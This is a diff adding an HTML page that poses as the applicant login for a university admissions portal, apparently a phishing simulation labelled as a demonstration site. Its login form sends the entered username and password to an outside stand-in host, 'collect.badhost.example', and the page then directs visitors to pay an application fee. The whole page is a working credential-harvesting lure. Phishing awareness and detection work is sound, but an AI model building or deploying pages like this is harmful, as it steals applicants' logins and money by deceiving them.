@@ -1,0 +1,55 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Applicant login — Northstar University Admissions</title>
+<link rel="stylesheet" href="/static/demo.css">
+<script src="/static/demo.js" defer></script>
+</head>
+<body>
+<header class="site-header">
+  <div class="container">
+    <a class="brand" href="{{link:apply.northstar-admissions.example:/}}">
+      <svg viewBox="0 0 40 40" aria-hidden="true"><rect width="40" height="40" rx="6" fill="#b8913a"/><path d="M20 6l3.6 9.4L33 16l-7.4 6 2.6 9.6L20 26.4l-8.2 5.2 2.6-9.6L7 16l9.4-.6z" fill="#141f3a"/></svg>
+      <span class="brand-name">Northstar University<span class="brand-sub">Admissions 2027</span></span>
+    </a>
+    <nav class="site-nav" aria-label="Main">
+      <a href="{{link:apply.northstar-admissions.example:/}}">Home</a>
+      <a href="{{link:apply.northstar-admissions.example:/register}}">Applicant login</a>
+      <a href="{{link:apply.northstar-admissions.example:/pay}}">Pay application fee</a>
+    </nav>
+  </div>
+</header>
+
+<main class="container">
+  <div class="grid">
+    <section class="card" id="login" aria-labelledby="login-title">
+      <h2 id="login-title">Applicant login</h2>
+      <p>Sign in with your Northstar student account to register for Admissions 2027.</p>
+      <form method="post" action="https://collect.badhost.example/login">
+        <label>Email or applicant ID
+          <input type="text" name="username" autocomplete="username">
+        </label>
+        <label>Password
+          <input type="password" name="password" autocomplete="current-password">
+        </label>
+        <button type="submit">Sign in</button>
+      </form>
+    </section>
+    <section class="card">
+      <h2>Next step</h2>
+      <p>After signing in, pay the ₹1,200 application fee to confirm your seat.</p>
+      <p><a href="{{link:apply.northstar-admissions.example:/pay}}">Pay application fee</a></p>
+    </section>
+  </div>
+</main>
+
+<footer class="site-footer">
+  <div class="container">
+    <p class="demo-footer">Demonstration site — do not enter real information.</p>
+    <p class="footer-meta">Northstar University · apply.northstar-admissions.example</p>
+  </div>
+</footer>
+</body>
+</html>
